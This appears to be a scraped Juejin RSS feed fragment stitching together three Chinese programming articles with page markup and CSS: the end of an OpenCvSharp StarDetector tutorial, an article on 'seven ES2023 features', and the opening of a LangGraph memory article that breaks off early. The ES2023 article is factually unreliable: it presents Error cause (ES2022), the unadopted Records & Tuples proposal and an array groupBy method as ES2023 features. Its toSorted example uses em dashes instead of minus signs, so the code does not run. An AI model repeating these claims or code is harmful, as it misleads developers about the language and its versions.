<p>Star特征检测是一种基于图像强度的特征点检测算法，它通过在不同尺度上寻找图像中的"星形"结构来识别关键点。该算法使用多尺度分析技术，能够检测不同大小的特征点，对图像中的角点和斑点都很敏感。Star检测器的工作原理是首先将图像转换为灰度图，然后通过计算每个像素点在不同尺度下的响应值来识别具有显著特征的点，最后应用非极大值抑制来筛选出最优的特征点。这种检测器特别适用于图像配准、物体识别、三维重建和图像拼接等计算机视觉应用，因为它能够提供稳定且可重复的特征点，即使在图像发生尺度变化或轻微旋转时也能保持较好的检测效果。</p>
<pre><code class="hljs language-scss" lang="scss"> <span class="hljs-comment">// 读取图像</span>
using Mat imgSrc = new <span class="hljs-built_in">Mat</span>(ImagePath, ImreadModes.Color);
using Mat imgGray = new <span class="hljs-built_in">Mat</span>();
using Mat imgDst = imgSrc<span class="hljs-selector-class">.Clone</span>();

<span class="hljs-comment">// 转换为灰度图像</span>
Cv2<span class="hljs-selector-class">.CvtColor</span>(imgSrc, imgGray, ColorConversionCodes.BGR2GRAY, <span class="hljs-number">0</span>);

<span class="hljs-comment">// 使用StarDetector算法检测特征点</span>
StarDetector detector = StarDetector<span class="hljs-selector-class">.Create</span>(MaxSize, ResponseThreshold, LineThresholdProjected, 
                                        LineThresholdBinarized, SuppressNonmaxSize);
KeyPoint<span class="hljs-selector-attr">[]</span> keypoints = detector<span class="hljs-selector-class">.Detect</span>(imgGray);

<span class="hljs-comment">// 在图像上绘制检测到的特征点</span>
if (keypoints != null)
{
   <span class="hljs-selector-tag">var</span> <span class="hljs-attribute">color</span> = new <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 绿色</span>
   foreach (KeyPoint kpt in keypoints)
   {
       <span class="hljs-attribute">float</span> r = kpt<span class="hljs-selector-class">.Size</span> / <span class="hljs-number">2</span>;
       Cv2<span class="hljs-selector-class">.Circle</span>(imgDst, (Point)kpt<span class="hljs-selector-class">.Pt</span>, (int)r, <span class="hljs-attribute">color</span>);
       Cv2<span class="hljs-selector-class">.Line</span>(imgDst,
           (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y + r),
           (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y - r),
           <span class="hljs-attribute">color</span>);
       Cv2<span class="hljs-selector-class">.Line</span>(imgDst,
           (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y + r),
           (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y - r),
           <span class="hljs-attribute">color</span>);
   }
}
</code></pre>
<p>使用过程就是读取图像、转换为灰度图像、使用StarDetector算法检测特征点与在图像上绘制检测到的特征点。</p>
<p>查看StarDetector.Create函数签名：</p>
<pre><code class="hljs language-ini" lang="ini">public static StarDetector Create(
  int <span class="hljs-attr">maxSize</span> = <span class="hljs-number">45</span>, 
  int <span class="hljs-attr">responseThreshold</span> = <span class="hljs-number">30</span>, 
  int <span class="hljs-attr">lineThresholdProjected</span> = <span class="hljs-number">10</span>, 
  int <span class="hljs-attr">lineThresholdBinarized</span> = <span class="hljs-number">8</span>,
  int <span class="hljs-attr">suppressNonmaxSize</span> = <span class="hljs-number">5</span>)
</code></pre>
<p>这个函数是 OpenCV 中 StarDetector 类的静态工厂方法，用于创建一个 Star 特征检测器的实例。</p>



































<table><thead><tr><th>参数名</th><th>默认值</th><th>含义</th></tr></thead><tbody><tr><td>maxSize</td><td>45</td><td>控制检测的最大特征点尺寸，较大的值可以检测更大的特征结构</td></tr><tr><td>responseThreshold</td><td>30</td><td>响应阈值，用于过滤掉响应值低于此阈值的特征点，提高检测质量</td></tr><tr><td>lineThresholdProjected</td><td>10</td><td>投影线阈值，用于控制线状结构的检测灵敏度</td></tr><tr><td>lineThresholdBinarized</td><td>8</td><td>二值化线阈值，进一步细化线状特征的检测标准</td></tr><tr><td>suppressNonmaxSize</td><td>5</td><td>非极大值抑制的邻域大小，用于在局部区域内保留最强的特征点</td></tr></tbody></table>
<p>效果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46c375170dd84499867bc6d37f9d894d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=ep%2B38VT0hZMuC08C8uCuJNjHMtQ%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 开发者必知的 7 个 ES2023 新特性，第5个能让代码量减少50%]]></title>    <link>https://juejin.cn/post/7583325900294766592</link>    <guid>https://juejin.cn/post/7583325900294766592</guid>    <pubDate>2025-12-15T00:17:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583325900294766592" data-draft-id="7583507286317481984" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 开发者必知的 7 个 ES2023 新特性，第5个能让代码量减少50%"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-12-15T00:17:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 开发者必知的 7 个 ES2023 新特性，第5个能让代码量减少50%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T00:17:15.000Z" title="Mon Dec 15 2025 00:17:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    36
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>JavaScript 开发者必知的 7 个 ES2023 新特性，第5个能让代码量减少50%</strong></h2>
<h3 data-id="heading-1">引言</h3>
<p>ES2023（ECMAScript 2023）是 JavaScript 语言的最新版本，带来了多项实用且强大的新特性。这些特性不仅提升了开发效率，还优化了代码的可读性和性能。本文将深入解析其中 7 个最重要的新特性，尤其是第 5 个特性，它能够显著减少代码量，让开发更加高效。无论你是前端开发者还是全栈工程师，掌握这些特性都将为你的项目带来质的飞跃。</p>
<hr/>
<h3 data-id="heading-2">1. Array.prototype.findLast() 和 findLastIndex()</h3>
<p>ES2023 为数组新增了两个方法：<code>findLast()</code> 和 <code>findLastIndex()</code>。它们的作用是从数组的末尾开始查找元素，而不是传统的从开头查找。</p>
<h4 data-id="heading-3">使用场景</h4>
<p>假设有一个数组 <code>[1, 2, 3, 4, 5, 2]</code>，你想找到最后一个值为 <code>2</code> 的元素或其索引。在 ES2023 之前，你需要手动逆序遍历数组或使用 <code>Array.reverse()</code>，现在可以直接调用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>];
<span class="hljs-keyword">const</span> lastTwo = arr.<span class="hljs-title function_">findLast</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item === <span class="hljs-number">2</span>); <span class="hljs-comment">// 2</span>
<span class="hljs-keyword">const</span> lastTwoIndex = arr.<span class="hljs-title function_">findLastIndex</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item === <span class="hljs-number">2</span>); <span class="hljs-comment">// 5</span>
</code></pre>
<h4 data-id="heading-4"><strong>为什么重要？</strong></h4>
<ul>
<li><strong>避免手动逆序遍历</strong>：简化了从后向前查找的逻辑。</li>
<li><strong>性能优化</strong>：无需创建反转数组的副本（<code>reverse()</code>会修改原数组）。</li>
</ul>
<hr/>
<h3 data-id="heading-5">2. Hashbang Grammar（Shebang）支持</h3>
<p>ES2023 正式支持 Hashbang（即 <code>#!</code>）语法，使得 JavaScript 文件可以直接作为脚本运行。</p>
<h4 data-id="heading-6"><strong>示例</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-meta">#!/usr/bin/env node</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Hello from a Node.js script!"</span>);
</code></pre>
<h4 data-id="heading-7"><strong>为什么重要？</strong></h4>
<ul>
<li><strong>标准化脚本执行</strong>：让 JavaScript CLI工具的开发更加规范化。</li>
<li><strong>跨平台兼容性</strong>：Unix/Linux系统可以直接识别并执行带有Shebang的脚本。</li>
</ul>
<hr/>
<h3 data-id="heading-8">3. Symbols as WeakMap Keys</h3>
<p>ES2023允许将<code>Symbol</code>作为<code>WeakMap</code>的键值，这为元编程和内存管理提供了更多可能性。</p>
<h4 data-id="heading-9"><strong>示例</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> weakMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();
<span class="hljs-keyword">const</span> key = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'privateData'</span>);
weakMap.<span class="hljs-title function_">set</span>(key, { <span class="hljs-attr">secret</span>: <span class="hljs-string">'123'</span> });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weakMap.<span class="hljs-title function_">get</span>(key)); <span class="hljs-comment">// { secret: '123' }</span>
</code></pre>
<h4 data-id="heading-10"><strong>为什么重要？</strong></h4>
<ul>
<li><strong>隐私保护</strong>：Symbol作为键可以防止外部直接访问数据。</li>
<li><strong>内存管理</strong>：WeakMap不会阻止垃圾回收器回收键对象的内存。</li>
</ul>
<hr/>
<h3 data-id="heading-11">4. Array.prototype.toReversed(), toSorted(), toSpliced(), and with()</h3>
<p>ES2023新增了四个非破坏性数组方法，它们不会修改原数组，而是返回一个新的数组副本。</p>






























<table><thead><tr><th>方法</th><th>作用</th><th>传统方式对比</th></tr></thead><tbody><tr><td><code>toReversed()</code></td><td>返回逆序数组</td><td><code>[...arr].reverse()</code></td></tr><tr><td><code>toSorted()</code></td><td>返回排序后的数组</td><td><code>[...arr].sort()</code></td></tr><tr><td><code>toSpliced(start, deleteCount, ...items)</code></td><td>返回拼接后的数组</td><td>手动复制并操作</td></tr><tr><td><code>with(index, value)</code></td><td>替换指定位置的元素并返回新数组</td><td>手动复制并赋值</td></tr></tbody></table>
<h4 data-id="heading-12"><strong>示例</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, —<span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> sorted = arr.<span class="hljs-title function_">toSorted</span>(); <span class="hljs-comment">// [—5, 1, 2]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// [1, 2,—5] （原数组不变）</span>
</code></pre>
<h4 data-id="heading-13"><strong>为什么重要？</strong></h4>
<ul>
<li><strong>不可变性支持</strong>：函数式编程中更安全地操作数据。</li>
<li><strong>减少错误</strong>：避免意外修改原数组的问题。</li>
</ul>
<hr/>
<h3 data-id="heading-14">5. #5: Records &amp; Tuples Proposal (Stage 2) ——代码量减少50%的关键！</h3>
<p>这是本文的重磅特性！虽然它目前处于 Stage 2（尚未正式纳入ES2023），但已经可以通过Babel或TypeScript尝鲜使用。它引入了两个新的数据结构：<strong>Record（不可变对象）和Tuple（不可变数组）</strong>。</p>
<h4 data-id="heading-15"><strong>核心优势</strong></h4>
<ul>
<li><strong>深度不可变</strong>:  数据一旦创建就无法修改。</li>
<li><strong>结构共享</strong>:  类似Immer.js的性能优化。</li>
<li><strong>值类型比较</strong>:  可以直接用 <code>===</code>比较内容是否相同。</li>
</ul>
<h4 data-id="heading-16"><strong>示例</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Record（类似对象）</span>
<span class="hljs-keyword">const</span> record = #{ <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>,<span class="hljs-attr">y</span>: <span class="hljs-number">2</span> };
<span class="hljs-comment">// Tuple（类似数组）</span>
<span class="hljs-keyword">const</span> tuple = #[<span class="hljs-number">1</span>,<span class="hljs-string">"hello"</span>,<span class="hljs-literal">true</span>];
</code></pre>
<h4 data-id="heading-17"><strong>实际应用</strong></h4>
<p>假设你有一个函数需要比较两个配置对象是否相同：</p>
<h5 data-id="heading-18"><strong>传统方式</strong></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isEqual</span>(<span class="hljs-params">a,b</span>){
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(a)===<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(b);
}
</code></pre>
<h5 data-id="heading-19"><strong>Records &amp; Tuples方式</strong></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isEqual</span>(<span class="hljs-params">a,b</span>){
    <span class="hljs-keyword">return</span> a===b;
}
</code></pre>
<p>不仅如此，React组件的props比较、Redux的状态管理等场景都可以大幅简化！</p>
<h5 data-id="heading-20"> 为什么能减少50%代码量？</h5>
<ol>
<li> 不再需要深拷贝/深比较工具函数（如lodash.isEqual）。</li>
<li> 不需要Immutable.js这样的第三方库。</li>
<li> 简化React的shouldComponentUpdate逻辑。</li>
</ol>
<hr/>
<h3 data-id="heading-21">6. Error Cause Chains (Error实例新增cause属性)</h3>
<p>ES2023允许在抛出错误时链式传递根本原因。</p>
<h4 data-id="heading-22"> 示例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">try</span>{
    <span class="hljs-title function_">connectToDatabase</span>();
}<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Failed to initialize app"</span>,{ <span class="hljs-attr">cause</span>:err });
}
</code></pre>
<p>捕获时可以访问完整的错误链：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">try</span>{
    <span class="hljs-title function_">initApp</span>();
}<span class="hljs-keyword">catch</span>(err){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">cause</span>);<span class="hljs-comment">//原始数据库错误</span>
}
</code></pre>
<h4 data-id="heading-23"> 为什么重要？</h4>
<ul>
<li> 更好的错误调试体验。</li>
<li> 保持完整的错误上下文。</li>
</ul>
<hr/>
<h3 data-id="heading-24">7. Array Grouping (Stage 3提案)</h3>
<p>虽然不是正式标准的一部分，但Chrome已经实现了这个功能。</p>
<p>通过groupBy方法可以轻松实现SQL式的分组操作：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> inventory=[
    {<span class="hljs-attr">name</span>:<span class="hljs-string">"asparagus"</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">"vegetables"</span>},
    {<span class="hljs-attr">name</span>:<span class="hljs-string">"bananas"</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">"fruit"</span>},
];
<span class="hljs-keyword">const</span> result=inventory.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function">(<span class="hljs-params">{type}</span>)=&gt;</span>type);
<span class="hljs-comment">/*结果:
{
vegetables:[...],
fruit:[...]
}
*/</span>
</code></pre>
<p>对比传统方式：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//以前需要reduce实现分组...</span>
</code></pre>
<hr/>
<p>##总结</p>
<p>ES2023的新特性覆盖了从数据结构到错误处理等多个方面：</p>
<p>✔️ findLast()让逆向查找更简单(20行→1行)<br/>
✔️ Records/Tuples可能改变我们处理不可变数据的方式(100行→50行)<br/>
✔️ Error Cause让错误处理更专业</p>
<p>建议你现在就尝试第5个特性——虽然还不是正式标准，但它代表了JavaScript未来的发展方向！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangGraph Memory 机制]]></title>    <link>https://juejin.cn/post/7584071941024186383</link>    <guid>https://juejin.cn/post/7584071941024186383</guid>    <pubDate>2025-12-16T06:46:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584071941024186383" data-draft-id="7583891046205734964" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" LangGraph Memory 机制"/> <meta itemprop="keywords" content="后端,AIGC,LangChain"/> <meta itemprop="datePublished" content="2025-12-16T06:46:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="树獭叔叔"/> <meta itemprop="url" content="https://juejin.cn/user/3734382051604446"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             LangGraph Memory 机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3734382051604446/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    树獭叔叔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:46:21.000Z" title="Tue Dec 16 2025 06:46:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>LangGraph 提供了两种类型的记忆机制，用于在不同场景下保存和检索信息：短期记忆（Short-term Memory）和长期记忆（Long-term Memory）。</p>
<h2 data-id="heading-0">概述</h2>
<ul>
